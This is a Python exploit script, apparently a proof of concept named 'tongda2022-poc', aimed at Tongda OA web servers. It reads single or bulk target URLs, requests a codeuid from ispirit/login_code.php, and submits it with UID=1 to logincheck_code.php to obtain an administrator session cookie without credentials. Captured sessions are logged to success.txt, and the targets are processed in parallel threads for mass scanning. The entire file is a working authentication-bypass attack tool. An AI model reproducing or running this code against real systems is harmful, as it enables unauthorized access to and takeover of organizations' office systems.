import requests
import re
import time
from threading import Thread
import warnings
import random
from multiprocessing import Pool
def main():
	warnings.filterwarnings('ignore')  # 忽略SSL警告
	print ("单url检测请按1，多url检测请按其他任意值:")
	choose=input()
	if choose=='1':
		print ("input:")
		url=input()
		bp(url)
	else:
		# 读取txt文件
		with open("./url.txt", "r") as f:
			# pool = Pool(60)
			for url in f.readlines():
				url = url.strip('\n')
				# print(url)
			#	 pool.apply_async(bp,(url,))
			# pool.close()
			# pool.join()
				t = Thread(target=bp, args=(url,))
				t.start()
def bp(url):
	try:
		if 'http' not in url:
			url='http://'+url
		codeuid=get_codeuid(url)
		if codeuid==0:
			print('[-]   '+url+'没找到codeuid....')
		else:
			print('[*]   '+url+'已找到codeuid：'+codeuid)
		getsession(url,codeuid)
	except:
		print('[!]   '+url+'连接失败')
def get_codeuid(url):
	if url[-1]=='/':
		urls = url + "ispirit/login_code.php"
	else:
		urls = url + "/ispirit/login_code.php"
	headers={
	'Content-Type': 'application/x-www-form-urlencoded'
	}
	body=''
	r=requests.post(urls,body,headers=headers,verify=False,timeout=5)
	if r.status_code==200 and 'codeuid"' in r.text:
		codeuid=r.json()['codeuid']
		print(codeuid)
		
	else:
		codeuid=0
	return codeuid
def getsession(urls,codeuid):
	if urls[-1]=='/':
		url = urls + "logincheck_code.php"
	else:
		url = urls + "/logincheck_code.php"

	headers = {
		'Content-Type': 'application/x-www-form-urlencoded',
}
	body='UID=1&CODEUID=_PC'+codeuid
	r=requests.post(url,body,headers=headers,verify=False,timeout=5)
	if 'status":1' in r.text:
		session=r.headers['Set-Cookie']
		print('[+]   '+url.replace('logincheck_code.php','general/')+'	session：'+session)
		fff = open("./success.txt", 'a')
		fff.write(url.replace('logincheck_code.php','general/')+'   session：'+session + '\n')
		fff.close()
	else:
		print('[-]   '+url+'没有漏洞')
def logo():
	print('''
 _                            _         ____    ___  ____   ____                            \r
| |_  ___   _ __    __ _   __| |  __ _ |___ \  / _ \|___ \ |___ \        _ __    ___    ___ \r
| __|/ _ \ | '_ \  / _` | / _` | / _` |  __) || | | | __) |  __) |_____ | '_ \  / _ \  / __|\r
| |_| (_) || | | || (_| || (_| || (_| | / __/ | |_| |/ __/  / __/|_____|| |_) || (_) || (__ \r
 \__|\___/ |_| |_| \__, | \__,_| \__,_||_____| \___/|_____||_____|      | .__/  \___/  \___|\r
                   |___/                                                |_|                 \r
\r
											   by Dsb v1.0\r
		''')
if __name__ == '__main__':
	logo()
	main()
